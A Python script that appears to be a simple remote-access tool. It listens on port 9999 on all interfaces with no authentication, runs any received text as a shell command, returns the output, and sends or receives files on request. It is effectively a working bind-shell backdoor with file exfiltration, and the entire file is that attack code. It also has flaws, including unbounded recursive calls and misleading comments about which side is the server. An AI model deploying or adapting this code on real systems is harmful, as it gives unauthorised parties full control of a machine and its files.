import socket
import sys
import subprocess
import os
import time


#create a socket
def create_socket():
    try:
        #global variable so that we can access these variables in other functions
        global host
        global port
        global s
        host=''
        port=9999
        s = socket.socket()

    except socket.error as error_messsage:
        print("Error creating socket: " + str(error_messsage))
        sys.exit()

#bind the socket to the port and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port: " + str(port))
        s.bind((host,port))
        s.listen(3) #listen for 3 connections at once (max)

    except socket.error as error_messsage:
        print("Error binding the port: " + str(error_messsage) + "\n" + "Retrying...")
        bind_socket() #call the function again to try binding again

#accept a connection with a server when socket is listening
def accept_connection():
    connection, address = s.accept()
    print("Connection has been established! | " + "IP " + address[0] + " | Port " + str(address[1]))
    currentWD = os.getcwd() + "> "
    connection.send(str.encode( currentWD))
    #do something with the connection
    check_commands(connection)
    connection.close()

#execute commands sent by the server
def check_commands(connection):
    while(True):
        data = connection.recv(1024)
        data = data.decode('utf-8')
        if "send" in ''.join(data[:5]).lower():
            receive_file_from_client(data,connection)
        elif "receive" in ''.join(data[:9]).lower():
            send_file_to_client(data,connection)
        else:
            execute_command(data,connection)



#execute command received by the client
def execute_command(command,connection):
    if command.lower()=="close":
        connection.close()
        
    if command[:2] == 'cd':
            os.chdir(command[3:])

    if len(command) > 0:
        cmd = subprocess.Popen(command[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read() # output and error messages
        output_str = str(output_byte,"utf-8") or "Command Exectuted Successfully."
        currentWD = os.getcwd() + "> " 
        connection.send(str.encode( currentWD + output_str ))
        print(output_str)
    check_commands(connection)


#send file to client that is asked to received
def send_file_to_client(command,connection):
    file_info_list = command.strip(' ') # remove trailing spaces
    file_info_list = list(map(str,file_info_list.split()))
    file_path = file_info_list[1] # 0th element is the command, 1st element is the file path
    if os.path.isfile(file_path):
        
        file_size = os.path.getsize(file_path)
        connection.send(str.encode(str(file_size)))
        # Opening file and sending data.
        with open(file_path, "rb") as file:
            c = 0
            # Starting the time capture.
            start_time = time.time()

            # Running loop while c != file_size.
            print("Sending file...")
            while c <= file_size:
                data = file.read(1024)
                if not (data):
                    break
                connection.sendall(data)
                c += len(data)

            # Ending the time capture.
            end_time = time.time()

        print("File succesfully sended to client. Total time to transfer: ", end_time - start_time)
    else:
        print ("File path does not exist")
        connection.send(str.encode("File path does not exist on server"))
    return None



#receive file from client
def receive_file_from_client(command,connection):
    file_info_list = command.strip(' ') # remove trailing spaces
    file_info_list = list(map(str,file_info_list.split()))
    file_name = file_info_list[2] or "temp" # 0th element is the command, 2nd element is the file name
    file_path = "./res/" + file_name
    os.makedirs(os.path.dirname(file_path), exist_ok=True)

    # Getting file details.
    file_size = connection.recv(100).decode()
    
    # Opening and reading file.
    with open( file_path, "wb") as file:
        c = 0
        # Starting the time capture.
        print("Receiving file...")
        start_time = time.time()

        # Running the loop while file is recieved.
        while c < int(file_size):
            data = connection.recv(1024)
            if not (data):
                break
            file.write(data)
            c += len(data)

        # Ending the time capture.
        end_time = time.time()
    

    print("File received from client. Total time: ", end_time - start_time)
    return None




def main():
    create_socket()
    bind_socket()
    accept_connection()


main()